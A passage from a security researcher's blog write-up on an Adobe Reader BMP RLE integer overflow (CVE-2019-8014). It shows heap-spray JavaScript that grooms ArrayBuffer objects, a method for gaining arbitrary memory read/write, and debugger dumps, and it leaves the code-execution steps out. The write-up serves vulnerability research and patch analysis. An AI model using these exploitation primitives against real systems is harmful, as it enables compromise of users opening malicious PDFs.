<h4 id="5-5-2-Memory-Layout-0"><a href="#5-5-2-Memory-Layout-0" class="headerlink" title="5.5.2 Memory Layout (0)"></a>5.5.2 Memory Layout (0)</h4><p>We can avoid the crash if we can make <code>0x10101010</code> acts like a valid pointer. Obviously, we should arrange the memory layout before triggering the vulnerability. To make it more stable, it should be done even before we create and free the <code>ArrayBuffer</code> objects.</p>
<p>We need the ability to put any value at any memory address, such as <code>0x10101010</code> . To achieve this goal, we can create lots of <code>ArrayBuffer</code> objects with <code>byteLength</code> setting to <code>0xFFE8</code> . That’s a carefully selected size to make sure that the <code>ArrayBuffer</code> objects will be allocated at predictable addresses.</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 0xFFE8 -&gt; byteLength</span></span><br><span class="line"><span class="comment">// 0x10 -&gt; sizeof ObjectElements</span></span><br><span class="line"><span class="comment">// 0x08 -&gt; sizeof heap block's metadata</span></span><br><span class="line"><span class="number">0xFFE8</span> + <span class="number">0x10</span> + <span class="number">0x08</span> = <span class="number">0x10000</span></span><br></pre></td></tr></table></figure>
<p>I’m not going to discuss how to avoid the crash in details, it’s very easy to figure out the specific conditions. Following code can be used to avoid the crash.</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fillHeap</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> array = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x1200</span>);</span><br><span class="line">    array[<span class="number">0</span>] = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0xFFE8</span>);</span><br><span class="line">    <span class="keyword">var</span> dv = <span class="keyword">new</span> <span class="built_in">DataView</span>(array[<span class="number">0</span>]);</span><br><span class="line">    </span><br><span class="line">    dv.setUint32(<span class="number">0xFB8</span>, <span class="number">0x10100058</span>, <span class="literal">true</span>);</span><br><span class="line">    dv.setUint32(<span class="number">0</span>, <span class="number">0x10100158</span>, <span class="literal">true</span>);</span><br><span class="line">    dv.setUint32(<span class="number">0xFFA8</span>, <span class="number">0x10100258</span>, <span class="literal">true</span>);</span><br><span class="line">    dv.setUint32(<span class="number">0x200</span> + <span class="number">0x14</span>, <span class="number">0x10100358</span>, <span class="literal">true</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>; i &amp;lt; array.length; ++i) &#123;</span><br><span class="line">        array[i] = array[<span class="number">0</span>].slice();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> array;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>It’s not done yet. The process still crashes when we try to create a new <code>DataView</code> object for it. We can avoid the crash using the same tricks. Following is the improved code.</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fillHeap</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> array = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x1200</span>);</span><br><span class="line">    array[<span class="number">0</span>] = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0xFFE8</span>);</span><br><span class="line">    <span class="keyword">var</span> dv = <span class="keyword">new</span> <span class="built_in">DataView</span>(array[<span class="number">0</span>]);</span><br><span class="line">    <span class="comment">// avoid crash when triggering the vulnerability</span></span><br><span class="line">    dv.setUint32(<span class="number">0xFB8</span>, <span class="number">0x10100058</span>, <span class="literal">true</span>);</span><br><span class="line">    dv.setUint32(<span class="number">0</span>, <span class="number">0x10100158</span>, <span class="literal">true</span>);</span><br><span class="line">    dv.setUint32(<span class="number">0xFFA8</span>, <span class="number">0x10100258</span>, <span class="literal">true</span>);</span><br><span class="line">    dv.setUint32(<span class="number">0x200</span> + <span class="number">0x14</span>, <span class="number">0x10100358</span>, <span class="literal">true</span>);</span><br><span class="line">    <span class="comment">// avoid crash when creating new DataView objects</span></span><br><span class="line">    dv.setUint32(<span class="number">0xFFA4</span>, <span class="number">0x10100458</span>, <span class="literal">true</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>; i &amp;lt; array.length; ++i) &#123;</span><br><span class="line">        array[i] = array[<span class="number">0</span>].slice();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> array;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="5-5-3-Global-Read-Write"><a href="#5-5-3-Global-Read-Write" class="headerlink" title="5.5.3 Global Read / Write"></a>5.5.3 Global Read / Write</h4><p>Once we overwrote the <code>byteLength</code> of any <code>ArrayBuffer</code> object with <code>0x10101010</code> , we can leverage this <code>ArrayBuffer</code> object to overwrite next one’s <code>byteLength</code> to <code>0xFFFFFFFF</code> . It’s very easy to search the next <code>ArrayBuffer</code> object if we put a flag value within all the <code>ArrayBuffer</code> objects.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  (1)byteLength            (3)Global Access</span><br><span class="line"> ┌─&lt;───&lt;───&lt;───┐            &lt;──────┬──────&gt;</span><br><span class="line">┌┼────────────┬┼────────────┬──────┼──────┬─────────────┐</span><br><span class="line">│ ArrayBuffer │ Bitmap Data │ ArrayBuffer │     Hole    │</span><br><span class="line">└──────┼──────┴─────────────┴┼────────────┴─────────────┘</span><br><span class="line">       └──&gt;───&gt;───&gt;───&gt;────&gt;─┘</span><br><span class="line">        (2) byteLength to -1</span><br></pre></td></tr></table></figure>
<p>Now we have the ability to read and write any memory address within the user space.</p>
<h4 id="5-5-4-Absolute-Address-Access"><a href="#5-5-4-Absolute-Address-Access" class="headerlink" title="5.5.4 Absolute Address Access"></a>5.5.4 Absolute Address Access</h4><p>Once we have the global access ability, we can <strong>search backward</strong> to calculate the base address of the <code>ArrayBuffer</code> object’s backing store buffer, thus we can read and write at any given absolute memory address.</p>
<p>We can search two flags, <code>ffeeffee</code> or <code>f0e0d0c0</code> , to calculate the base address. To make it more accurate, the bytes around the flag value also need to be verified.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">0:014&gt; dd 30080000</span><br><span class="line">30080000  16b80e9e 0101331b ffeeffee 00000002  ; ffeeffee</span><br><span class="line">30080010  055a00a4 2f0b0010 055a0000 30080000  ; +0x14 -&gt; 30080000</span><br><span class="line">30080020  00000fcf 30080040 3104f000 000002e5</span><br><span class="line">30080030  00000001 00000000 30d69ff0 30d69ff0</span><br><span class="line">30080040  3eb82e96 08013313 00000000 0000ffe8</span><br><span class="line">30080050  00000000 00000000 10100158 00000000</span><br><span class="line">30080060  00000000 00000000 00000000 00000000</span><br><span class="line">30080070  00000000 00000000 00000000 00000000</span><br><span class="line"></span><br><span class="line">0:014&gt; dd 305f4000</span><br><span class="line">305f4000  00000000 00000000 6ab08d69 0858b71a</span><br><span class="line">305f4010  0bbab388 30330080 0ff00112 f0e0d0c0  ; f0e0d0c0</span><br><span class="line">305f4020  15dc2c3f 00000430 305f402c d13bc929  ; +0x0C -&gt; 305f402c</span><br><span class="line">305f4030  e5c521a7 d9b264d4 919cee58 45da954e</span><br><span class="line">305f4040  5c3f608b 2b5fd340 0bae3aa9 2b5fd340</span><br><span class="line">305f4050  0fae32aa d13bc929 e5c521a7 d9b264d4</span><br><span class="line">305f4060  919cee58 45da954e 9c3f608b f952aa94</span><br><span class="line">305f4070  989c772a a1dd934a ac5b154b 2fadd038</span><br></pre></td></tr></table></figure>
<h4 id="5-5-5-Remaining-Steps"><a href="#5-5-5-Remaining-Steps" class="headerlink" title="5.5.5 Remaining Steps"></a>5.5.5 Remaining Steps</h4><p>Once we can read and write at any given absolute memory address, it’s very easy to achieve code execution. Following are the remaining steps that will not be discussed in this post:</p>
<ul>
<li>EIP hijack</li>
<li>ASLR bypass</li>
<li>DEP bypass</li>
<li>CFG bypass</li>
</ul>
<h2 id="0x06-CVE-2013-2729"><a href="#0x06-CVE-2013-2729" class="headerlink" title="0x06. CVE-2013-2729"></a>0x06. CVE-2013-2729</h2><p>Three integer overflows were found within the handling of RLE compressed data, one in RLE8 decompression and the other two in RLE4 decompression.</p>
<p>Why shouldn’t we found four? Because another one have been patched six years ago. You can read <a href="http://blog.binamuse.com/2013/05/readerbmprle.html" target="_blank" rel="noopener">feliam’s write up for CVE-2013-2729</a> if you haven’t read it yet.</p>
<p>Also, the patch for CVE-2013-2729 can be found within the handling of RLE8 compressed data.</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dst_xpos = BYTE1(cmd) + xpos;</span><br><span class="line"><span class="keyword">if</span> ( ypos &gt;= height || dst_xpos &lt; xpos || </span><br><span class="line">     dst_xpos &lt; BYTE1(cmd) || dst_xpos &gt; width )  <span class="comment">// overflow check</span></span><br><span class="line">  <span class="keyword">goto</span> LABEL_170;         <span class="comment">// CxxThrowException</span></span><br></pre></td></tr></table></figure>
<p>It’s astonishing that Adobe only patched the case that was reported and ignored the other three.</p>
<h2 id="0x07-Lessons-Learned"><a href="#0x07-Lessons-Learned" class="headerlink" title="0x07. Lessons Learned"></a>0x07. Lessons Learned</h2><p>For product developers, please try to understand the root cause of the vulnerability and eliminate similar ones as much as you can.</p>
<p>For security researchers, patch analysis is a good way to figure out what the developers were thinking, and maybe you can find bypass solutions (this happens sometimes).</p>

      
    </div>
    
    
    

    

    
      <div>
        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
  <div>学到新姿势了吗？打赏请随意！</div>
  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
    <span>Donate</span>
  </button>
  <div id="QR" style="display: none;">

    
      <div id="wechat" style="display: inline-block">
        <img id="wechat_qr" src="/uploads/wechatpay.jpg" alt="Ke Liu WeChat Pay">
        <p>WeChat Pay</p>
      </div>
    

    

    

  </div>
</div>

      </div>
    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/Adobe-Reader/" rel="tag"># Adobe Reader</a>
          
            <a href="/tags/PDF/" rel="tag"># PDF</a>
          
            <a href="/tags/CVE-2019-8014/" rel="tag"># CVE-2019-8014</a>
          
            <a href="/tags/CVE-2013-2729/" rel="tag"># CVE-2013-2729</a>
          
            <a href="/tags/XFA/" rel="tag"># XFA</a>
          
            <a href="/tags/BMP/" rel="tag"># BMP</a>
          
            <a href="/tags/RLE/" rel="tag"># RLE</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2019/09/12/deep-analysis-of-cve-2019-8014-cn/" rel="next" title="深入分析 Adobe 忽略了 6 年的 PDF 漏洞">
                <i class="fa fa-chevron-left"></i> 深入分析 Adobe 忽略了 6 年的 PDF 漏洞
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2020/02/23/windows-debugging-symbols-proxy-rules/" rel="prev" title="Windows 调试符号下载代理配置">
                Windows 调试符号下载代理配置 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          
  <div class="comments" id="comments">
    
  </div>


        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            Table of Contents
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview">
            Overview
          </li>
        </ul>
      

      <section class="site-overview sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
          <img class="site-author-image" itemprop="image" src="/images/avatar.gif" alt="Ke Liu">
          <p class="site-author-name" itemprop="name">Ke Liu</p>
           
              <p class="site-description motion-element" itemprop="description">Security Researcher Working at Tencent Security Xuanwu Lab</p>
          
        </div>
        <nav class="site-state motion-element">

          
            <div class="site-state-item site-state-posts">
              <a href="/archives/">
                <span class="site-state-item-count">15</span>
                <span class="site-state-item-name">posts</span>
              </a>
            </div>
          

          
            
            
            <div class="site-state-item site-state-categories">
              <a href="/categories/index.html">
                <span class="site-state-item-count">11</span>
                <span class="site-state-item-name">categories</span>
              </a>
            </div>
          

          
            
            
            <div class="site-state-item site-state-tags">
              <a href="/tags/index.html">
                <span class="site-state-item-count">40</span>
                <span class="site-state-item-name">tags</span>
              </a>
            </div>
          

        </nav>

        
          <div class="feed-link motion-element">
            <a href="/atom.xml" rel="alternate">
              <i class="fa fa-rss"></i>
              RSS
            </a>
          </div>
        

        <div class="links-of-author motion-element">
          
            
              <span class="links-of-author-item">
                <a href="https://twitter.com/klotxl404" target="_blank" title="Twitter">
                  
                    <i class="fa fa-fw fa-twitter"></i>
                  
                    
                      Twitter
                    
                </a>
              </span>
            
          
        </div>

        
        

        
        

        


      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-Introduction"><span class="nav-text">0x01. Introduction</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-Debugging-Environment"><span class="nav-text">0x02. Debugging Environment</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-Bitmap-Structures"><span class="nav-text">0x03. Bitmap Structures</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-Structures"><span class="nav-text">3.1 Structures</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#3-1-1-Bitmap-File-Header"><span class="nav-text">3.1.1 Bitmap File Header</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-1-2-Bitmap-Info-Header"><span class="nav-text">3.1.2 Bitmap Info Header</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-1-3-RGBQUAD-Array"><span class="nav-text">3.1.3 RGBQUAD Array</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-1-4-Bitmap-Data"><span class="nav-text">3.1.4 Bitmap Data</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-2-Run-Length-Encoding"><span class="nav-text">3.2 Run Length Encoding</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#3-2-1-RLE8"><span class="nav-text">3.2.1 RLE8</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-2-2-RLE4"><span class="nav-text">3.2.2 RLE4</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-Vulnerability-Details"><span class="nav-text">0x04. Vulnerability Details</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#4-1-Code-Identification"><span class="nav-text">4.1 Code Identification</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-2-Vulnerability-Analysis"><span class="nav-text">4.2 Vulnerability Analysis</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#4-2-1-RLE8-Decoding"><span class="nav-text">4.2.1 RLE8 Decoding</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-2-2-RLE4-Decoding"><span class="nav-text">4.2.2 RLE4 Decoding</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-Exploit"><span class="nav-text">0x05. Exploit</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#5-1-Overflow-Candidate"><span class="nav-text">5.1 Overflow Candidate</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-2-SpiderMonkey-Concepts"><span class="nav-text">5.2 SpiderMonkey Concepts</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#5-2-1-ArrayBuffer"><span class="nav-text">5.2.1 ArrayBuffer</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-2-2-Array"><span class="nav-text">5.2.2 Array</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-2-3-JSObject"><span class="nav-text">5.2.3 JSObject</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-3-Bitmap-Construct"><span class="nav-text">5.3 Bitmap Construct</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-4-PDF-Construct"><span class="nav-text">5.4 PDF Construct</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-5-Exploit-Tricks"><span class="nav-text">5.5 Exploit Tricks</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#5-5-1-Memory-Layout-1"><span class="nav-text">5.5.1 Memory Layout (1)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-5-2-Memory-Layout-0"><span class="nav-text">5.5.2 Memory Layout (0)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-5-3-Global-Read-Write"><span class="nav-text">5.5.3 Global Read / Write</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-5-4-Absolute-Address-Access"><span class="nav-text">5.5.4 Absolute Address Access</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-5-5-Remaining-Steps"><span class="nav-text">5.5.5 Remaining Steps</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-CVE-2013-2729"><span class="nav-text">0x06. CVE-2013-2729</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x07-Lessons-Learned"><span class="nav-text">0x07. Lessons Learned</span></a></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">
  
  &copy;  2010 - 
  <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Ke Liu</span>
</div>


<div class="powered-by">
  Powered by <a class="theme-link" href="https://hexo.io">Hexo</a>
</div>

<div class="theme-info">
  Theme -
  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
    NexT.Pisces
  </a>
</div>


        

        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>

  
  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  
  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.2"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.2"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.2"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.2"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.2"></script>



  


  




	





  





  






  





  

  

  

  

  

  

</body>
</html>
